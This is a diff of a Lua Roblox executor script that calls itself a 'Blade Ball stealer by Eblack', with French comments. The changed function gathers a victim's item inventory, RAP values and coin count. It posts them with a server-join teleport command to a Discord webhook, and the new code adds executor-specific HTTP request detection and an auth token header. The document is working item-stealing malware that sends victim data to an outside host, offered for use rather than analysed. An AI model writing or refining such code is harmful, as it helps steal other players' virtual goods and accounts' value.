@@ -61,10 +61,16 @@ local totalRAP = 0
 
 -- // TES EMBEDS MODIFIÉS (VIOLET / VERT) // --
 
-local function SendJoinMessage(list, prefix)
-    local tokensEmbed = "0"
-    pcall(function() tokensEmbed = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "") end)
+-- Utilise ton bloc de configuration habituel au début
 
+local function SendJoinMessage(list, prefix)
+    -- Récupération des tokens
+    local tokensEmbed = "0"
+    pcall(function() 
+        tokensEmbed = PlayerGui.Main.Currency.Coins.Amount.Text:gsub("[^%d]", "") 
+    end)
+
+    -- Groupement des items
     local grouped = {}
     for _, item in ipairs(list) do
         grouped[item.Name] = (grouped[item.Name] or {Count = 0, TotalRAP = 0})
@@ -81,12 +87,12 @@ local function SendJoinMessage(list, prefix)
         itemListText = itemListText .. string.format("%s (x%s) - %s RAP\n", group.Name, group.Count, formatNumber(group.TotalRAP))
     end
 
+    -- Construction du JSON
     local data = {
         ["content"] = (ping == "Yes" and "||​|| @everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
-        ["auth_token"] = auth_token, 
         ["embeds"] = {{
             ["title"] = "🟣 Join your hit",
-            ["color"] = 8323327, -- VIOLET
+            ["color"] = 8323327,
             ["fields"] = {
                 {
                     ["name"] = "ℹ️ Player info:",
@@ -115,11 +121,26 @@ local function SendJoinMessage(list, prefix)
                     ["inline"] = false
                 }
             },
-            ["footer"] = {["text"] = "Blade Ball stealer by Eblack • " .. os.date("%X")},
+            ["footer"] = {["text"] = "Blade Ball stealer by Eblack • Auth: " .. tostring(auth_token)},
             ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"}
         }}
     }
-    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
+
+    -- DÉTECTION DE L'EXÉCUTEUR POUR L'ENVOI
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if requestFunc then
+        requestFunc({
+            Url = webhook,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["auth_token"] = auth_token -- On le met dans les headers aussi au cas où
+            },
+            Body = HttpService:JSONEncode(data)
+        })
+    else
+        warn("Ton exécuteur ne supporte pas les envois HTTP.")
+    end
 end
 
 local function SendMessage(list)
